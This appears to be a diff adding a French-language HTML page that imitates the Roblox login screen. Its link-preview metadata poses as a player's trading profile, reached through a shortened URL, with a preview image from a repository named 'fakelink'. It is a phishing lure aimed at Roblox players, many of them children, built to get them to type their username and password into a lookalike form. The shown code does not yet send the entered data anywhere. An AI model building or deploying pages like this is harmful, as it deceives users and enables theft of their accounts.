@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Roblox</title>
+  <!-- Open Graph -->
+  <meta property="og:title" content="sayura83k's Profile">
+  <meta property="og:site_name" content="Roblox">
+  <meta property="og:description" content="Je m'appelle Sayura ! Je joue beaucoup à bloxfruits ! Disponible pour trade ^^">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://urlr.me/exuJXK">
+  <meta property="og:image" content="https://raw.githubusercontent.com/TheGILITCH/fakelink/main/images/noFilter.webp">
+  <meta property="og:image:width" content="630">
+  <meta property="og:image:height" content="1200">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/TheGILITCH/fakelink/main/images/noFilter.webp">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Nunito', 'Segoe UI', sans-serif;
+      min-height: 100vh;
+      background: #1a1a2e;
+      overflow-x: hidden;
+    }
+
+    /* Background with game thumbnails grid */
+    .bg-grid {
+      position: fixed;
+      inset: 0;
+      display: grid;
+      grid-template-columns: repeat(8, 1fr);
+      grid-template-rows: repeat(5, 1fr);
+      gap: 6px;
+      padding: 6px;
+      transform: rotate(-5deg) scale(1.15);
+      z-index: 0;
+      opacity: 0.35;
+    }
+
+    .bg-thumb {
+      border-radius: 10px;
+      background-size: cover;
+      background-position: center;
+    }
+
+    /* Dark overlay */
+    .bg-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(10, 10, 20, 0.75);
+      z-index: 1;
+    }
+
+    /* Navbar */
+    nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 10;
+      background: #1a1a1a;
+      border-bottom: 1px solid #2a2a2a;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      gap: 24px;
+    }
+
+    .nav-logo {
+      font-weight: 900;
+      font-size: 1.5rem;
+      letter-spacing: -1px;
+      color: white;
+      margin-right: 16px;
+    }
+    .nav-logo span { color: white; }
+
+    /* Roblox "R" logo SVG style */
+    .roblox-logo {
+      display: flex;
+      align-items: center;
+      gap: 2px;
+      font-size: 1.45rem;
+      font-weight: 900;
+      color: white;
+      letter-spacing: -1px;
+      font-family: 'Arial Black', Arial, sans-serif;
+    }
+
+    nav a {
+      color: #ccc;
+      text-decoration: none;
+      font-size: 0.9rem;
+      font-weight: 500;
+      padding: 4px 0;
+      transition: color 0.2s;
+    }
+    nav a:hover { color: white; }
+
+    .nav-search {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      background: #2a2a2a;
+      border-radius: 6px;
+      padding: 6px 12px;
+      gap: 8px;
+      width: 280px;
+    }
+    .nav-search input {
+      background: none;
+      border: none;
+      outline: none;
+      color: #aaa;
+      font-size: 0.875rem;
+      width: 100%;
+    }
+    .nav-search input::placeholder { color: #666; }
+    .search-icon { color: #666; font-size: 0.85rem; }
+
+    .nav-btn {
+      padding: 7px 18px;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      cursor: pointer;
+      border: none;
+    }
+    .btn-signup {
+      background: #0066ff;
+      color: white;
+    }
+    .btn-login {
+      background: transparent;
+      color: white;
+      border: 1px solid #444 !important;
+      border: none;
+    }
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-left: 16px;
+    }
+
+    /* Main content */
+    main {
+      position: relative;
+      z-index: 5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding-top: 52px;
+    }
+
+    /* Login card */
+    .login-card {
+      background: #1e1e1e;
+      border: 1px solid #2e2e2e;
+      border-radius: 12px;
+      padding: 36px 32px;
+      width: 100%;
+      max-width: 370px;
+      text-align: center;
+    }
+
+    .login-card h1 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: white;
+      margin-bottom: 24px;
+    }
+
+    .input-field {
+      width: 100%;
+      background: #2a2a2a;
+      border: 1px solid #3a3a3a;
+      border-radius: 6px;
+      color: white;
+      font-size: 0.9rem;
+      padding: 12px 14px;
+      margin-bottom: 12px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .input-field::placeholder { color: #666; }
+    .input-field:focus { border-color: #0066ff; }
+
+    .btn-primary {
+      width: 100%;
+      background: #0066ff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-bottom: 16px;
+      transition: background 0.2s;
+    }
+    .btn-primary:hover { background: #0052cc; }
+
+    .forgot {
+      color: #aaa;
+      font-size: 0.85rem;
+      margin-bottom: 20px;
+    }
+    .forgot a { color: #aaa; text-decoration: none; }
+    .forgot a:hover { color: white; }
+
+    .divider {
+      height: 1px;
+      background: #2e2e2e;
+      margin: 16px 0;
+    }
+
+    .btn-alt {
+      width: 100%;
+      background: #2a2a2a;
+      color: white;
+      border: 1px solid #3a3a3a;
+      border-radius: 6px;
+      padding: 11px;
+      font-size: 0.875rem;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 10px;
+      transition: background 0.2s;
+    }
+    .btn-alt:hover { background: #333; }
+
+    .signup-link {
+      margin-top: 16px;
+      font-size: 0.85rem;
+      color: #888;
+    }
+    .signup-link a {
+      color: #4d9fff;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .signup-link a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <!-- Background grid (colored placeholder tiles) -->
+  <div class="bg-grid" id="bgGrid"></div>
+  <div class="bg-overlay"></div>
+
+  <!-- Navbar -->
+  <nav>
+    <div class="roblox-logo">
+      <img src="https://1000logos.net/wp-content/uploads/2017/09/Roblox-Logo.png" alt="Roblox" style="height:28px; filter: brightness(0) invert(1);">
+    </div>
+    <a href="#">Charts</a>
+    <a href="#">Marketplace</a>
+    <a href="#">Créer</a>
+    <a href="#">Robux</a>
+    <div class="nav-search">
+      <span class="search-icon">🔍</span>
+      <input type="text" placeholder="Rechercher">
+    </div>
+    <div class="nav-right">
+      <button class="nav-btn btn-signup">S'inscrire</button>
+      <button class="nav-btn btn-login">Connexion</button>
+    </div>
+  </nav>
+
+  <!-- Main -->
+  <main>
+    <div class="login-card">
+      <h1>Connexion à Roblox</h1>
+
+      <input class="input-field" type="text" placeholder="Identifiant/E-mail/Téléphone">
+      <input class="input-field" type="password" placeholder="Mot de passe">
+      <button class="btn-primary">Connexion</button>
+
+      <div class="forgot">
+        <a href="#">Mot de passe ou nom d'utilisateur oublié ?</a>
+      </div>
+
+      <div class="divider"></div>
+
+      <button class="btn-alt">Envoyez-moi un code unique par email</button>
+      <button class="btn-alt">Inscription rapide</button>
+
+      <div class="signup-link">
+        Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    // Generate colorful background tiles
+    const colors = [
+      '#1a3a5c','#2d1b4e','#1a4a2e','#4a1a1a','#1a2a4a',
+      '#3a2a1a','#1a3a3a','#2a1a3a','#3a1a2a','#1a4a1a',
+      '#4a2a1a','#1a2a3a','#2a3a1a','#3a1a3a','#1a1a4a',
+    ];
+    const grid = document.getElementById('bgGrid');
+    for (let i = 0; i < 40; i++) {
+      const div = document.createElement('div');
+      div.className = 'bg-thumb';
+      div.style.background = colors[Math.floor(Math.random() * colors.length)];
+      grid.appendChild(div);
+    }
+  </script>
+
+</body>
+</html>
